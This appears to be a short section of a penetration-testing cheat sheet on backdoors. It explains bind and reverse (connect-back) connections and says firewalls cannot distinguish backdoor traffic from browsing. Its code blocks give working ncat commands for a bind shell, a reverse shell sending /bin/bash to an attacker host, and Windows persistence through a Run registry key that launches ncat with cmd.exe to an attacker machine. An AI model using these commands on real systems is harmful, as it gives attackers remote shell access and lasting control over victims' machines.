### Backdoor

Backdoors have two components, server and client:

+ *Server* runs on the victim machine listening on the network in order to accept connections.
+ *Client* runs on the attacker machine.
+ If the backdoor server sits behind a firewall, the easiest way to archive a connection is using a Connect-back Backdoor or Reverse Backdoor.
+ A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine.

**Create stable connection to a remote host**
``` python
# Listener
ncat -l -v -p 5555 -e /bin/bash
# Client
ncat x.x.x.x 5555

## Reverse connection
# => Attacker/Listener
ncat -l -p 5555 -v
# => Victim / Client
ncat -e /bin/bash remoteIP remotePort
```
```python
# Persist execution in windows
> regedit.exe
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\CurrentVersion\Run

# Add string value
Name: ncat
Value: yourpath\ncat attackerMachine Port -e cmd.exe
```
